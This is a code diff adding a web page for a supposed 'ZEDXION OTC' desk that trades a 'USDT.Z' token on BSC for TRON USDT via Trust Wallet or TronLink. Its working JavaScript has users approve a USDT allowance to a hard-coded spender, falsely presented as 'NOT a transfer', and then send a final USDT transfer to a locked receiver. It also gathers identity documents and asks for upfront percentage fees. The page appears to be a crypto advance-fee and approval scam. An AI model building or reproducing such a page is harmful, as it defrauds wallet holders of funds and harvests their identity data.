@@ -1,0 +1,575 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>ZEDXION OTC — Trust Wallet Compatible (TRON + BSC)</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#0b0f14">
+<style>
+  :root{ --bg:#0b0f14; --card:#0f1622; --ink:#e7edf5; --mut:.75; --line:#1e2a36; --pri:#1e88e5; --acc:#00c6a7; --warn:#ffb74d; --ok:#81c784; --bad:#ff8a80 }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:Inter,ui-sans-serif,system-ui,Segoe UI,Roboto,Helvetica,Arial}
+  .wrap{max-width:1040px;margin:28px auto;padding:16px}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:20px;position:relative}
+  h1{font-size:24px;margin:0 0 6px}
+  h2{font-size:18px;margin:14px 0 8px}
+  .muted{opacity:var(--mut)} .small{font-size:12px}
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  .row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
+  input,button,textarea,select{width:100%;padding:12px;border-radius:12px;border:1px solid #243448;background:#0e141b;color:var(--ink)}
+  button{cursor:pointer}
+  .btn{background:#1a2330;border-color:#2b3d54}
+  .btn.pri{background:var(--pri);border-color:var(--pri);color:#fff}
+  .btn.acc{background:var(--acc);border-color:var(--acc);color:#002b28}
+  .btn.warn{background:var(--warn);border-color:var(--warn);color:#241c00}
+  .kv{display:flex;justify-content:space-between;align-items:center;background:#0e141b;border:1px solid #1a2635;border-radius:12px;padding:10px;margin-top:8px}
+  .tag{display:inline-block;padding:4px 10px;border-radius:999px;background:#0e141b;border:1px solid #1a2635;font-size:12px;margin-right:6px}
+  .section{margin-top:14px}
+  .note{background:#0e2238;border-left:3px solid var(--pri);padding:10px;border-radius:10px;margin-top:10px}
+  pre{white-space:pre-wrap;background:#0e141b;border:1px solid #1a2635;border-radius:12px;padding:12px;max-height:380px;overflow:auto;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px;line-height:1.35}
+  a{color:#8ab4ff;text-decoration:none}
+  .divider{height:1px;background:#1a2635;margin:12px 0}
+  .inline{display:flex;gap:10px;flex-wrap:wrap}
+  .active{border:1px solid var(--pri)}
+  .footer-legal{margin-top:22px;text-align:center}
+  .floating-chat{position:fixed;right:18px;bottom:18px;display:flex;flex-direction:column;gap:10px;z-index:9999}
+  .floating-chat a{display:inline-flex;align-items:center;gap:8px;padding:10px 14px;border-radius:999px;background:#1a2330;border:1px solid #2b3d54;color:#e7edf5;text-decoration:none;font-size:14px}
+  .warnbox{background:#2a1e00;border:1px solid #4a3800;border-radius:12px;padding:10px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="card">
+    <div class="header" style="display:flex;gap:10px;align-items:center">
+      <div>
+        <h1>ZEDXION OTC — USDT.Z (BSC) • Trust Wallet Ready</h1>
+        <div class="muted small">v7.TW: Trust Wallet DApp browser support • TronLink fallback • Live balances • Auto confirm</div>
+      </div>
+      <div style="margin-left:auto;display:flex;gap:8px;align-items:center">
+        <button id="connectBtn" class="btn pri">Connect Wallet (TRON)</button>
+        <span id="who" class="small muted">Not connected</span>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="row">
+        <div class="kv"><span class="small">Treasury (BEP20)</span><b id="treasuryLbl" class="small">0x2c586269fCaB0D9ABD9224105a8eC0E1d2397A0f</b></div>
+        <div class="kv"><span class="small">Live TRON USDT balances</span>
+          <span class="small">Owner: <b id="balOwner">—</b> • Desk: <b id="balDesk">—</b></span>
+        </div>
+      </div>
+      <div class="inline" style="margin-top:8px">
+        <a id="scanLink" class="small" target="_blank" rel="noopener">View Treasury on BscScan</a>
+        <button class="btn" id="refreshBalancesBtn">Refresh USDT Balances</button>
+      </div>
+      <div id="twHint" class="note small" style="display:none">
+        Tip: If you're using Trust Wallet, open this page inside the Trust Wallet DApp Browser. Then tap <b>Connect Wallet</b>.
+      </div>
+      <div id="noProvider" class="warnbox small" style="display:none">
+        No TRON provider detected. Open this page in the Trust Wallet DApp Browser or install TronLink. Without a TRON provider, Approve/Transfer won't work.
+      </div>
+    </div>
+
+    <div class="divider"></div>
+
+    <h2>Step 1 — Create Order</h2>
+    <div class="row">
+      <div>
+        <label class="small">USDT.Z to receive (BSC)</label>
+        <input id="amt" inputmode="decimal" placeholder="e.g., 1000000">
+      </div>
+      <div>
+        <label class="small">Recipient (BEP20)</label>
+        <input id="recipient" placeholder="0x... (BSC address)">
+      </div>
+    </div>
+    <div class="inline" style="margin-top:10px">
+      <button id="createOrder" class="btn pri">Create Order</button>
+      <span class="small muted">Order ID will be used next.</span>
+    </div>
+    <div class="kv"><span class="small">Order ID</span><b id="orderIdLbl">—</b></div>
+
+    <div class="divider"></div>
+
+    <h2>Step 2 — Approve USDT (No Send)</h2>
+    <div class="note small">
+      Approve <b>1%</b> of your order on TRON. Contract: <b id="usdtLbl"></b>. This is NOT a transfer.
+    </div>
+    <div class="row">
+      <div>
+        <label class="small">1% allowance (TRON USDT)</label>
+        <input id="feeLbl" readonly placeholder="Auto-calculated…">
+      </div>
+      <div>
+        <label class="small">TXID (approve)</label>
+        <input id="approveTxId" readonly placeholder="—">
+        <a id="tronscanLink" style="display:none" class="small" target="_blank" rel="noopener">Tronscan</a>
+        <div class="small muted" id="approveConfirm">Waiting…</div>
+      </div>
+    </div>
+
+    <div class="row" style="margin-top:8px">
+      <div>
+        <label class="small">Spender (TRON)</label>
+        <input id="tronSpender" value="TA7N69PY2SsxsDQbNswh81XUwu9QN7PJhF" readonly>
+        <div class="inline" style="margin-top:8px">
+          <button class="btn pri" id="approveAddressBtn">Approve (Trust Wallet / TronLink)</button>
+          <button class="btn" id="tronCheckBtn">Check Wallet</button>
+          <button class="btn" id="diagBtn">Diagnostics</button>
+        </div>
+        <div class="small muted" id="tronStatus">Not checked yet.</div>
+      </div>
+      <div>
+        <pre id="approveLog">Log:</pre>
+      </div>
+    </div>
+
+    <div class="divider"></div>
+
+    <h2>Step 3 — Receive USDT.Z (Desk Transfer)</h2>
+    <div class="row3">
+      <div class="kv"><span class="small">Desk sends from Treasury</span><b id="releaseAmt">—</b></div>
+      <div class="kv"><span class="small">Destination (BEP20)</span><b id="destLbl" class="small">—</b></div>
+      <div class="kv"><span class="small">Status</span><b id="statusLbl" class="small">Awaiting 1% Approval</b></div>
+    </div>
+
+    <div class="divider"></div>
+
+    <h2>Step 4 — Final TRON USDT (Transfer)</h2>
+    <div class="note small">
+      Final settlement via <b>transfer(to, amount)</b> on USDT TRC20.
+    </div>
+    <div class="row">
+      <div><label class="small">Final amount (USDT)</label><input id="finalAmt" inputmode="decimal" placeholder="e.g., 990000"></div>
+      <div><label class="small">Desk receiver (TRON — locked)</label><input id="finalRecipient" readonly></div>
+    </div>
+    <div class="row" style="margin-top:8px">
+      <div>
+        <label class="small">TXID (final)</label>
+        <input id="txid2" readonly placeholder="—">
+        <a id="tronscanLink2" style="display:none" class="small" target="_blank" rel="noopener">Tronscan</a>
+        <div class="small muted" id="finalConfirm">Waiting…</div>
+      </div>
+      <div class="inline" style="align-items:flex-end">
+        <button class="btn acc" id="sendFinalBtn">Send TRC20 (Final)</button>
+        <button class="btn" id="checkAllowanceBtn">Check Allowance</button>
+      </div>
+    </div>
+    <pre id="finalLog">Final Log:</pre>
+
+    <div class="divider"></div>
+
+    <h2>KYC</h2>
+    <div class="row">
+      <div><label class="small">Full name</label><input id="kycName" placeholder="John Doe"></div>
+      <div><label class="small">Email</label><input id="kycEmail" placeholder="name@example.com"></div>
+    </div>
+    <div class="row">
+      <div><label class="small">Country</label><input id="kycCountry" placeholder="India"></div>
+      <div>
+        <label class="small">ID Type</label>
+        <select id="kycIdType">
+          <option value="Passport">Passport</option>
+          <option value="National ID">National ID</option>
+          <option value="Driver's License">Driver's License</option>
+          <option value="Other">Other</option>
+        </select>
+      </div>
+    </div>
+    <div class="row">
+      <div><label class="small">ID Number</label><input id="kycIdNumber" placeholder="XXXXXXXXXXXX"></div>
+      <div><label class="small">Upload ID (front)</label><input type="file" id="kycUpload" accept="image/*,application/pdf"></div>
+    </div>
+    <div id="kycStatus" class="small muted">No file uploaded yet.</div>
+
+    <div class="divider"></div>
+
+    <h2>Order Packet</h2>
+    <div class="inline" style="margin-top:8px">
+      <button id="gen" class="btn pri">Generate Order Packet</button>
+      <button id="copy" class="btn acc">Copy Packet</button>
+    </div>
+    <pre id="packet"></pre>
+
+    <div class="note small footer-legal">
+      Official ZEDXION coin otc page — Payment structure 1% must be in wallet to proceed; remaining 2% to same address or ZEDXION representative.
+    </div>
+  </div>
+</div>
+
+<div class="floating-chat">
+  <a id="whats" target="_blank" rel="noopener">WhatsApp Support</a>
+  <a id="tg" target="_blank" rel="noopener">@zedxionotc Telegram Support</a>
+</div>
+
+<script>
+// ====== CONFIG (edit these constants) ======
+const TREASURY_BEP20 = '0x2c586269fCaB0D9ABD9224105a8eC0E1d2397A0f';
+const TRON_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC20
+const DESK_TRON_RECEIVER = 'TXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'; // << set your official TRON receiver here >>
+const SUPPORT_WHATSAPP = 'https://wa.me/00000000000'; // << replace with your full WhatsApp link >>
+const SUPPORT_TELEGRAM = 'https://t.me/zedxionotc'; // << replace with your Telegram link >>
+
+const MIN = 500000, MAX = 200000000;
+
+// ====== State ======
+let order = null;
+let ownerBase58 = null;
+
+// ====== Helpers ======
+const $ = id => document.getElementById(id);
+const log = (...a) => { const s = a.map(x => (typeof x === 'object'? JSON.stringify(x) : String(x))).join(' '); const box = $('approveLog'); box.textContent += '\\n' + s; console.log(...a); };
+const flog = (...a) => { const s = a.map(x => (typeof x === 'object'? JSON.stringify(x) : String(x))).join(' '); const box = $('finalLog'); box.textContent += '\\n' + s; console.log(...a); };
+
+function setActive(id){ ['s1','s2','s3','s4'].forEach(s => { const el=$(s); if(el) el.classList.remove('active'); }); const e=$(id); if(e) e.classList.add('active'); }
+function usdtUnits(f){ return Math.floor(f * 1e6); } // 6 decimals
+
+// ---- Provider detection (Trust Wallet + TronLink) ----
+function getTronProvider(){
+  // Trust Wallet DApp browser may expose window.tronWeb or window.tronLink-style API via window.trustwallet
+  if (window.tronWeb) return window.tronWeb;
+  if (window.tronLink && window.tronLink.tronWeb) return window.tronLink.tronWeb;
+  if (window.trustwallet && window.trustwallet.tronWeb) return window.trustwallet.tronWeb;
+  if (window.trustwallet && window.trustwallet.tronLink && window.trustwallet.tronLink.tronWeb) return window.trustwallet.tronLink.tronWeb;
+  return null;
+}
+
+async function requestTronAccounts(){
+  // Try Trust Wallet style, then TronLink
+  if (window.trustwallet && window.trustwallet.tronLink && typeof window.trustwallet.tronLink.request==='function'){
+    try{ await window.trustwallet.tronLink.request({ method:'tron_requestAccounts' }); return true; }catch(e){ log('trustwallet.tronLink request error:', e?.message||e); }
+  }
+  if (window.tronLink && typeof window.tronLink.request==='function'){
+    try{ await window.tronLink.request({ method:'tron_requestAccounts' }); return true; }catch(e){ log('tronLink request error:', e?.message||e); }
+  }
+  // Fallback: some providers expose enable()
+  try{
+    const tw = getTronProvider();
+    if (tw && typeof tw.request==='function'){ await tw.request({ method:'tron_requestAccounts' }); return true; }
+  }catch(e){ log('generic request error:', e?.message||e); }
+  return false;
+}
+
+function tw(){ return getTronProvider(); }
+
+async function ensureAccount(showHints=true){
+  // Attempt to connect if not already
+  const provider = tw();
+  if(!provider){
+    if(showHints){
+      $('twHint').style.display = 'block';
+      $('noProvider').style.display = 'block';
+    }
+    throw new Error('No TRON provider injected.');
+  }
+  // Try requesting accounts once
+  await requestTronAccounts().catch(()=>{});
+
+  const addr = provider.defaultAddress?.base58 || provider.defaultAddress?.hex;
+  if(!addr){
+    if(showHints){
+      $('twHint').style.display = 'block';
+    }
+    throw new Error('No Tron account connected.');
+  }
+  ownerBase58 = provider.defaultAddress.base58 || toB58(provider, provider.defaultAddress.hex);
+  $('who').textContent = 'Connected: ' + ownerBase58.slice(0,6) + '…' + ownerBase58.slice(-6);
+  return provider;
+}
+
+function toHex(t, a){ try{ if(a?.startsWith('T')) return t.address.toHex(a); }catch(e){} return a; }
+function toB58(t, a){ try{ if(a?.startsWith('41')) return t.address.fromHex(a); }catch(e){} return a; }
+
+// ====== Init labels/buttons ======
+$('treasuryLbl').textContent = TREASURY_BEP20;
+$('scanLink').href = 'https://bscscan.com/address/' + TREASURY_BEP20;
+$('usdtLbl').textContent = TRON_USDT;
+$('finalRecipient').value = DESK_TRON_RECEIVER;
+$('whats').href = SUPPORT_WHATSAPP;
+$('tg').href = SUPPORT_TELEGRAM;
+
+// Connect button
+$('connectBtn').onclick = async () => {
+  try{
+    await ensureAccount();
+    $('noProvider').style.display = 'none';
+    $('twHint').style.display = 'none';
+  }catch(e){
+    $('who').textContent = e.message || String(e);
+    $('noProvider').style.display = 'block';
+  }
+};
+
+// ====== Step 1 ======
+$('createOrder').onclick = () => {
+  const amt = Number(($('amt').value||'').trim());
+  const rcpt = ($('recipient').value||'').trim();
+  if(!isFinite(amt) || amt<=0 || !rcpt) return alert('Enter amount & recipient');
+  if(amt<MIN || amt>MAX) return alert('Amount out of range');
+  order = { id: 'ORD-' + Math.random().toString(36).slice(2,8).toUpperCase(), amt, onePct: amt*0.01, onePctInt: usdtUnits(amt*0.01) };
+  $('orderIdLbl').textContent = order.id;
+  $('feeLbl').value = order.onePct.toLocaleString('en-US',{maximumFractionDigits:6});
+  $('releaseAmt').textContent = amt.toLocaleString('en-US');
+  $('destLbl').textContent = rcpt;
+  setActive('s1');
+};
+
+// ====== Diagnostics & Balances ======
+$('tronCheckBtn').onclick = async () => {
+  try{
+    const t = await ensureAccount();
+    $('tronStatus').textContent = 'Wallet: ' + ownerBase58;
+    const node = await t.trx.getNodeInfo().catch(()=>null);
+    log('NodeInfo:', node || '(none)');
+  }catch(e){
+    $('tronStatus').textContent = e.message || String(e);
+    log('Check error:', e?.message||e);
+  }
+};
+
+$('diagBtn').onclick = async () => {
+  try{
+    const t = await ensureAccount();
+    const acc = await t.trx.getAccount(ownerBase58);
+    const res = await t.trx.getAccountResources(ownerBase58);
+    const balTrx = (acc.balance||0)/1e6;
+    const bw = res?.freeNetLimit || 0;
+    const bwUsed = res?.freeNetUsed || 0;
+    const energy = res?.EnergyLimit || 0;
+    const energyUsed = res?.EnergyUsed || 0;
+    log('Balance TRX:', balTrx);
+    log('Bandwidth used/limit:', bwUsed, '/', bw);
+    log('Energy used/limit:', energyUsed, '/', energy);
+    if(balTrx < 30) log('⚠ Low TRX: top up ~30–60 TRX.');
+  }catch(e){
+    log('Diag error:', e?.message||e);
+  }
+};
+
+async function readUSDTBalance(t, whoB58){
+  try{
+    const c = await t.contract().at(TRON_USDT);
+    let raw;
+    if(typeof c.balanceOf === 'function'){ raw = await c.balanceOf(whoB58).call(); }
+    else if(c.methods && typeof c.methods.balanceOf === 'function'){ raw = await c.methods.balanceOf(whoB58).call(); }
+    else{
+      const res = await t.transactionBuilder.triggerSmartContract(
+        toHex(t, TRON_USDT),'balanceOf(address)',
+        { feeLimit: 40_000_000 },[{type:'address', value: toHex(t, whoB58)}],0, whoB58
+      );
+      raw = res?.constant_result?.[0] ? parseInt(res.constant_result[0],16) : 0;
+    }
+    return Number(String(raw))/1e6;
+  }catch{ return NaN; }
+}
+
+$('refreshBalancesBtn').onclick = async () => {
+  try{
+    const t = await ensureAccount();
+    const me = await readUSDTBalance(t, ownerBase58);
+    const desk = DESK_TRON_RECEIVER.startsWith('T') ? await readUSDTBalance(t, DESK_TRON_RECEIVER) : NaN;
+    $('balOwner').textContent = isNaN(me) ? '—' : me.toLocaleString('en-US',{maximumFractionDigits:6});
+    $('balDesk').textContent = isNaN(desk) ? '—' : desk.toLocaleString('en-US',{maximumFractionDigits:6});
+  }catch(e){
+    log('Balance error:', e?.message||e);
+  }
+};
+
+// ====== Step 2 Approve ======
+async function pollConfirm(txid, labelEl){
+  const t = tw();
+  if(!t) return;
+  for(let i=0;i<18;i++){ // ~90s
+    try{
+      const info = await t.trx.getTransactionInfo(txid);
+      if(info && typeof info.receipt === 'object'){
+        const rc = info.receipt.result || info.result;
+        labelEl.textContent = 'Status: ' + rc + (info.blockNumber ? ' • Block ' + info.blockNumber : '');
+        if(rc === 'SUCCESS'){ return true; }
+      }
+    }catch{}
+    await new Promise(r => setTimeout(r, 5000));
+  }
+  labelEl.textContent = 'Status: Pending (timed out)';
+  return false;
+}
+
+$('approveAddressBtn').onclick = async () => {
+  if(!order) return alert('Create order first');
+  try{
+    const t = await ensureAccount();
+    const spenderIn = ($('tronSpender').value||'').trim();
+    const amount = order.onePctInt;
+    $('approveLog').textContent = 'Log:';
+    log('Approve request:', { owner: ownerBase58, spender: spenderIn, usdt: TRON_USDT, microUSDT: String(amount) });
+
+    let txid = null;
+    try{
+      const usdt = await t.contract().at(TRON_USDT);
+      if(typeof usdt.approve === 'function'){
+        log('Path1: contract.approve().send');
+        const r = await usdt.approve(spenderIn, amount).send({ feeLimit: 120_000_000, callValue: 0, shouldPollResponse: false });
+        txid = typeof r==='string'? r : r?.txid || r?.transaction?.txID;
+      }else if(usdt.methods && typeof usdt.methods.approve === 'function'){
+        log('Path1b: contract.methods.approve().send');
+        const r = await usdt.methods.approve(spenderIn, amount).send({ feeLimit: 120_000_000, callValue: 0, shouldPollResponse: false });
+        txid = typeof r==='string'? r : r?.txid || r?.transaction?.txID;
+      }
+    }catch(e){ log('High-level error:', e?.message||e); }
+
+    if(!txid){
+      log('Path2: triggerSmartContract');
+      const res = await t.transactionBuilder.triggerSmartContract(
+        toHex(t, TRON_USDT),'approve(address,uint256)',
+        { feeLimit: 120_000_000, callValue: 0 },
+        [{ type:'address', value: toHex(t, spenderIn) }, { type:'uint256', value: String(amount) }],
+        0, ownerBase58
+      );
+      log('trigger result:', res);
+      if(!res?.transaction) throw new Error('triggerSmartContract returned no transaction');
+      const signed = await t.trx.sign(res.transaction);
+      log('signed ok');
+      const sent = await t.trx.sendRawTransaction(signed);
+      log('broadcast:', sent);
+      txid = sent?.txid || sent?.transaction?.txID;
+    }
+
+    if(!txid) throw new Error('No txid from wallet/broadcast');
+    $('approveTxId').value = txid;
+    const link = $('tronscanLink'); link.href = 'https://tronscan.org/#/transaction/'+txid; link.style.display = 'inline';
+    $('tronStatus').textContent = 'Submitted. Waiting for confirmation…';
+    log('Tx sent:', txid);
+
+    // auto-confirm polling
+    $('approveConfirm').textContent = 'Status: Checking…';
+    const ok = await pollConfirm(txid, $('approveConfirm'));
+    if(ok){ $('statusLbl').textContent = 'Approval confirmed'; $('tronStatus').textContent = 'Approval confirmed on-chain.'; }
+  }catch(e){
+    $('tronStatus').textContent = 'Error: ' + (e?.message || String(e));
+    log('Approve error:', e?.message || e);
+  }
+};
+
+$('checkAllowanceBtn').onclick = async () => {
+  try{
+    const t = await ensureAccount();
+    const spender = ($('tronSpender').value || '').trim();
+    const c = await t.contract().at(TRON_USDT);
+    let raw;
+    if(typeof c.allowance === 'function'){ raw = await c.allowance(ownerBase58, spender).call(); }
+    else if(c.methods && typeof c.methods.allowance === 'function'){ raw = await c.methods.allowance(ownerBase58, spender).call(); }
+    else{
+      const res2 = await t.transactionBuilder.triggerSmartContract(
+        toHex(t, TRON_USDT),'allowance(address,address)',
+        { feeLimit: 50_000_000 },
+        [{ type:'address', value: toHex(t, ownerBase58) }, { type:'address', value: toHex(t, spender) }],
+        0, ownerBase58
+      );
+      raw = res2?.constant_result?.[0] ? parseInt(res2.constant_result[0],16) : 0;
+    }
+    const allowed = Number(String(raw))/1e6;
+    flog('Allowance (owner→spender):', allowed, 'USDT');
+  }catch(e){
+    flog('Allowance check error:', e?.message || e);
+  }
+};
+
+// ====== Step 4 Transfer ======
+function usdtFromFloat(valStr){
+  const n = Number((valStr||'').trim());
+  if(!isFinite(n) || n<=0) return null;
+  return Math.floor(n*1e6);
+}
+
+$('sendFinalBtn').onclick = async () => {
+  try{
+    const t = await ensureAccount();
+    const toAddr = DESK_TRON_RECEIVER;
+    const micro = usdtFromFloat($('finalAmt').value);
+    if(!toAddr || !toAddr.startsWith('T')) throw new Error('Desk receiver address not set.');
+    if(!micro) throw new Error('Enter a valid final amount');
+    $('finalLog').textContent = 'Final Log:';
+    flog('Transfer request:', { to: toAddr, microUSDT: String(micro), usdt: TRON_USDT });
+
+    let txid = null;
+    try{
+      const usdt = await t.contract().at(TRON_USDT);
+      if(typeof usdt.transfer === 'function'){
+        flog('Path1: contract.transfer().send');
+        const r = await usdt.transfer(toAddr, micro).send({ feeLimit: 120_000_000, callValue: 0, shouldPollResponse: false });
+        txid = typeof r==='string'? r : r?.txid || r?.transaction?.txID;
+      }else if(usdt.methods && typeof usdt.methods.transfer === 'function'){
+        flog('Path1b: contract.methods.transfer().send');
+        const r = await usdt.methods.transfer(toAddr, micro).send({ feeLimit: 120_000_000, callValue: 0, shouldPollResponse: false });
+        txid = typeof r==='string'? r : r?.txid || r?.transaction?.txID;
+      }
+    }catch(e){ flog('High-level transfer error:', e?.message||e); }
+
+    if(!txid){
+      flog('Path2: triggerSmartContract transfer');
+      const res = await t.transactionBuilder.triggerSmartContract(
+        toHex(t, TRON_USDT),'transfer(address,uint256)',
+        { feeLimit: 120_000_000, callValue: 0 },
+        [{ type:'address', value: toHex(t, toAddr) }, { type:'uint256', value: String(micro) }],
+        0, ownerBase58
+      );
+      flog('trigger result:', res);
+      if(!res?.transaction) throw new Error('triggerSmartContract returned no transaction');
+      const signed = await t.trx.sign(res.transaction);
+      flog('signed ok');
+      const sent = await t.trx.sendRawTransaction(signed);
+      flog('broadcast:', sent);
+      txid = sent?.txid || sent?.transaction?.txID;
+    }
+
+    if(!txid) throw new Error('No txid from wallet/broadcast');
+    $('txid2').value = txid;
+    const link2 = $('tronscanLink2'); link2.href = 'https://tronscan.org/#/transaction/'+txid; link2.style.display = 'inline';
+    flog('Final Tx sent:', txid);
+
+    // auto-confirm polling
+    $('finalConfirm').textContent = 'Status: Checking…';
+    await pollConfirm(txid, $('finalConfirm'));
+  }catch(e){
+    flog('Final transfer error:', e?.message || e);
+    alert(e?.message || String(e));
+  }
+};
+
+// ====== KYC & Packet ======
+$('kycUpload').addEventListener('change', (e) => {
+  const f = e.target.files && e.target.files[0];
+  $('kycStatus').textContent = f ? ('Uploaded: ' + f.name) : 'No file uploaded yet.';
+});
+
+$('gen').onclick = () => {
+  const pkt = {
+    treasury_bep20: TREASURY_BEP20,
+    order,
+    approve_txid: $('approveTxId').value || null,
+    approve_status: $('approveConfirm').textContent || null,
+    final_txid: $('txid2').value || null,
+    final_status: $('finalConfirm').textContent || null,
+    recipient_bep20: $('destLbl').textContent || null,
+    desk_receiver_tron: DESK_TRON_RECEIVER,
+    final_amount_tron: $('finalAmt').value || null,
+    kyc: {
+      name: $('kycName').value || null,
+      email: $('kycEmail').value || null,
+      country: $('kycCountry').value || null,
+      id_type: $('kycIdType').value || null,
+      id_number: $('kycIdNumber').value || null,
+      file: $('kycStatus').textContent || null
+    },
+    timestamp: new Date().toISOString()
+  };
+  $('packet').textContent = JSON.stringify(pkt, null, 2);
+};
+
+$('copy').onclick = async () => {
+  try{ await navigator.clipboard.writeText($('packet').textContent); alert('Packet copied'); }
+  catch(e){ alert('Copy failed'); }
+};
+</script>
+</body>
+</html>
